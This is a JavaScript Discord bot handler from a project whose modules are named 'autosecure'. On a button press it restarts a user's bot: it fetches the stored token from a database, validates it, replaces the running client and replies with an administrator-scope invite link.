const { autosecureMap } = require("../../handlers/botHandler");
const autosecure = require("../../../autosecure/autosecure");
const { queryParams } = require("../../../db/database");
const checkToken = require("../../../autosecure/utils/utils/checkToken");
const showbotmsg = require("../../../autosecure/utils/bot/showbotmsg");

module.exports = {
    name: "restart",
    editbot: true,
    callback: async (client, interaction) => {
        let id = interaction.customId.split('|')[4];
        await interaction.update({ content: `Restarting bot!`})
        
        
        let botnumber = interaction.customId.split('|')[2];
        let result = await queryParams(`SELECT * FROM autosecure WHERE user_id = ? AND botnumber = ?`, [interaction.user.id, botnumber]);
        
        if (!result || result.length === 0) {
            return interaction.editReply({
                content: `No token found for this bot, you likely deleted this bot.`
            });
        }

        let token = result[0].token;
        
        let checked = await checkToken(token);
        if (!checked) {
            return interaction.editReply({
                content: `Invalid discord token! Please use the change token button first then restart.`
            });
        }

     //   console.log(`id: ${interaction.user.id}`);
        let d = `${interaction.user.id}|${botnumber}`;
    //    console.log(`key: ${d}`);
        let c = autosecureMap.get(d);
        
        if (c) {
            autosecureMap.delete(d);
            c.destroy();
        }

        let as = await autosecure(token, interaction.user.id, botnumber);
        autosecureMap.set(d, as);

        let msg = await showbotmsg(interaction.user.id, botnumber, interaction.user.id, client);

        const inviteLink = `https://discord.com/oauth2/authorize?client_id=${as.user.id}&permissions=8&scope=bot+applications.commands`;
        const content = `[Restarted bot! [Click to Invite]](${inviteLink})`;

        msg.content = content;
        await interaction.editReply(msg);
    }
};
